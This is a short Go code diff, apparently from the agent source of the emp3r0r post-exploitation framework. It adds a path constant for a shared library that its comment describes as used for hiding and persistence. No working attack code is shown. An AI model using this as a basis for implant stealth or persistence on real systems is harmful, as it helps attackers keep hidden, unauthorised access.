@@ -16,6 +16,9 @@ var (
 	// UtilsPath binary path of utilities
 	UtilsPath = AgentRoot + "/..."
 
+	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
+	Libemp3r0rFile = UtilsPath + "/libemp3r0r.so"
+
 	// HTTPClient handles agent's http communication
 	HTTPClient *http.Client
 
